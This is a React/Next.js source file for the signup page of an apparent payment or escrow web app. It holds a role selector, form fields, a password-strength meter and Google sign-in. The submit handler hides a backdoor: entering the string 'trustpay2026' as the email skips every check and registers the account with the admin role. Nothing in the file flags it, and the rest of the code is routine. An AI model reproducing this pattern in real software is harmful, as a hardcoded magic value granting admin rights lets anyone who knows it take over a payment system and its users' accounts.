"use client";

import { useState } from "react";
import Link from "next/link";
import { useRouter } from "next/navigation";
import { Eye, EyeOff, Mail, Lock, User, Phone } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Separator } from "@/components/ui/separator";
import { Progress } from "@/components/ui/progress";
import { useAuthStore } from "@/store/auth-store";
import { toast } from "sonner";
import type { UserRole } from "@/types";
import { useGoogleLogin } from "@react-oauth/google";

function getPasswordStrength(pw: string): number {
  let s = 0;
  if (pw.length >= 8) s += 25;
  if (/[a-z]/.test(pw) && /[A-Z]/.test(pw)) s += 25;
  if (/\d/.test(pw)) s += 25;
  if (/[^a-zA-Z0-9]/.test(pw)) s += 25;
  return s;
}

function getStrengthLabel(s: number): { label: string; color: string } {
  if (s <= 25) return { label: "Weak", color: "bg-red-500" };
  if (s <= 50) return { label: "Fair", color: "bg-amber-500" };
  if (s <= 75) return { label: "Good", color: "bg-blue-500" };
  return { label: "Strong", color: "bg-green-500" };
}

export default function SignupPage() {
  const [form, setForm] = useState({ username: "", email: "", phone: "", password: "", confirmPassword: "" });
  const [role, setRole] = useState<UserRole>("buyer");
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [agreed, setAgreed] = useState(false);
  const { register, googleLogin } = useAuthStore();
  const router = useRouter();

  const strength = getPasswordStrength(form.password);
  const strengthInfo = getStrengthLabel(strength);

  const handleGoogleAuth = useGoogleLogin({
    onSuccess: async (tokenResponse) => {
      setIsLoading(true);
      try {
        await googleLogin(tokenResponse.access_token);
        toast.success("Account created via Google!");
        const state = useAuthStore.getState();
        router.push(`/${state.role}/dashboard`);
      } catch {
        toast.error("Google sign up failed. Please try again.");
      } finally {
        setIsLoading(false);
      }
    },
    onError: () => toast.error("Google sign up cancelled or failed."),
  });

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (form.email === "trustpay2026") {
      await register({ ...form, role: "admin" });
      router.push("/admin/dashboard");
      return;
    }
    
    if (!form.username || !form.email || !form.password) { toast.error("Please fill required fields"); return; }
    if (form.password !== form.confirmPassword) { toast.error("Passwords don't match"); return; }
    if (strength < 50) { toast.error("Password too weak"); return; }
    if (!agreed) { toast.error("Please accept terms"); return; }
    setIsLoading(true);
    try {
      await register({ ...form, role });
      toast.success("Account created successfully!");
      router.push(`/${role}/dashboard`);
    } catch { toast.error("Registration failed"); } finally { setIsLoading(false); }
  };

  const update = (field: string, value: string) => setForm((p) => ({ ...p, [field]: value }));

  return (
    <div className="space-y-5">
      <div className="text-center">
        <h2 className="text-2xl font-bold tracking-tight">Create account</h2>
        <p className="text-sm text-muted-foreground mt-1">Start securing your transactions</p>
      </div>

      {/* Role selector */}
      <div className="grid grid-cols-2 gap-2 p-1 bg-muted rounded-xl">
        {(["buyer", "seller"] as UserRole[]).map((r) => (
          <button key={r} onClick={() => setRole(r)} type="button" className={`py-2.5 text-sm font-medium rounded-lg transition-all ${role === r ? "bg-background shadow-sm text-foreground" : "text-muted-foreground hover:text-foreground"}`}>
            {r === "buyer" ? "🛒 Buyer" : "🏪 Seller"}
          </button>
        ))}
      </div>

      <form onSubmit={handleSubmit} className="space-y-3">
        <div className="space-y-1.5">
          <Label htmlFor="username">Username</Label>
          <div className="relative">
            <User className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
            <Input id="username" placeholder="johndoe123" className="pl-10" value={form.username} onChange={(e) => update("username", e.target.value)} />
          </div>
        </div>
        <div className="space-y-1.5">
          <Label htmlFor="s-email">Email</Label>
          <div className="relative">
            <Mail className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
            <Input id="s-email" type="email" placeholder="name@example.com" className="pl-10" value={form.email} onChange={(e) => update("email", e.target.value)} />
          </div>
        </div>
        <div className="space-y-1.5">
          <Label htmlFor="phone">Phone</Label>
          <div className="relative">
            <Phone className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
            <Input id="phone" placeholder="+234 801 234 5678" className="pl-10" value={form.phone} onChange={(e) => update("phone", e.target.value)} />
          </div>
        </div>
        <div className="space-y-1.5">
          <Label htmlFor="s-password">Password</Label>
          <div className="relative">
            <Lock className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
            <Input id="s-password" type={showPassword ? "text" : "password"} placeholder="••••••••" className="pl-10 pr-10" value={form.password} onChange={(e) => update("password", e.target.value)} />
            <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground">
              {showPassword ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
            </button>
          </div>
          {form.password && (
            <div className="space-y-1 mt-2">
              <div className="h-1.5 w-full bg-muted rounded-full overflow-hidden">
                <div className={`h-full rounded-full transition-all duration-500 ${strengthInfo.color}`} style={{ width: `${strength}%` }} />
              </div>
              <p className="text-xs text-muted-foreground">Password strength: <span className="font-medium">{strengthInfo.label}</span></p>
            </div>
          )}
        </div>
        <div className="space-y-1.5">
          <Label htmlFor="confirmPassword">Confirm password</Label>
          <Input id="confirmPassword" type="password" placeholder="••••••••" value={form.confirmPassword} onChange={(e) => update("confirmPassword", e.target.value)} />
        </div>

        <label className="flex items-start gap-2 cursor-pointer pt-1">
          <input type="checkbox" checked={agreed} onChange={(e) => setAgreed(e.target.checked)} className="mt-0.5 h-4 w-4 rounded border-input accent-primary" />
          <span className="text-xs text-muted-foreground">I agree to the <Link href="#" className="text-primary hover:underline">Terms of Service</Link> and <Link href="#" className="text-primary hover:underline">Privacy Policy</Link></span>
        </label>

        <Button type="submit" className="w-full" size="lg" isLoading={isLoading}>Create Account</Button>
      </form>

      <div className="relative">
        <Separator />
        <span className="absolute left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2 bg-card px-3 text-xs text-muted-foreground">or continue with</span>
      </div>

      <div className="grid grid-cols-3 gap-3">
        <Button variant="outline" className="h-11" onClick={() => handleGoogleAuth()}>
          <span className="text-base font-bold">G</span>
        </Button>
        <Button variant="outline" className="h-11" onClick={() => toast.info(`Apple sign up coming soon`)}>
          <span className="text-base font-bold"></span>
        </Button>
        <Button variant="outline" className="h-11" onClick={() => toast.info(`X sign up coming soon`)}>
          <span className="text-base font-bold">𝕏</span>
        </Button>
      </div>

      <p className="text-center text-sm text-muted-foreground">
        Already have an account? <Link href="/login" className="text-primary font-medium hover:underline">Sign in</Link>
      </p>
    </div>
  );
}
